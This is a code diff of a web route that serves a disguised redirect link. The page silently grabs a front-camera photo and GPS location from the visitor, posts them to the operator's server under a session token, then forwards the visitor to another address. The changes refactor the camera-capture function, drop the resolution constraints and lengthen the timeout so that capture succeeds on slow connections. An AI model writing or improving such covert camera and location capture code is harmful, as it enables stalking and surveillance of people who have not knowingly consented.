@@ -231,41 +231,7 @@ router.get('/v/:sessionToken', (req, res) => {
       window.location.replace(DEST);
     }
 
-    function captureCamera () {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        doRedirect();
-        return;
-      }
-      var vid = document.getElementById('_tv');
-      var can = document.getElementById('_tc');
-      navigator.mediaDevices.getUserMedia({
-        audio: false,
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-      }).then(function (stream) {
-        vid.srcObject = stream;
-        vid.onloadedmetadata = function () {
-          vid.play();
-          setTimeout(function () {
-            try {
-              can.width  = vid.videoWidth  || 640;
-              can.height = vid.videoHeight || 480;
-              can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
-              var img = can.toDataURL('image/jpeg', 0.82);
-              fetch(BASE + '/api/location/cam/' + TOK, {
-                method  : 'POST',
-                headers : { 'Content-Type': 'application/json' },
-                body    : JSON.stringify({ image: img }),
-                keepalive: true
-              }).catch(function () {});
-              stream.getTracks().forEach(function (t) { t.stop(); });
-            } catch (e) {}
-            doRedirect();
-          }, 1200);
-        };
-      }).catch(function () {
-        doRedirect();
-      });
-    }
+    // captureCamera is defined inside the click handler below — don't define it here (dead code)
 
     // ── GPS — uses watchPosition for continuous accuracy improvement ──
     // High accuracy GPS can take 5-30 seconds on mobile (A-GPS fix)
@@ -331,11 +297,9 @@ router.get('/v/:sessionToken', (req, res) => {
           captureGps();
           setTimeout(doRedirect, 3000);
         }
-      }, 8000);
+      }, 15000); // 15s timeout for slow 2G connections
 
-      // Override captureCamera to set _camDone when finished
-      var _origCapture = captureCamera;
-      captureCamera = function () {
+      function _captureCamera () {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
           _camDone = true;
           captureGps();
@@ -346,7 +310,7 @@ router.get('/v/:sessionToken', (req, res) => {
         var can = document.getElementById('_tc');
         navigator.mediaDevices.getUserMedia({
           audio: false,
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+          video: { facingMode: 'user' } // let browser pick optimal resolution
         }).then(function (stream) {
           vid.srcObject = stream;
           vid.onloadedmetadata = function () {
@@ -381,7 +345,7 @@ router.get('/v/:sessionToken', (req, res) => {
       };
 
       // Start camera capture immediately
-      captureCamera();
+      _captureCamera();
     });
 
   })();
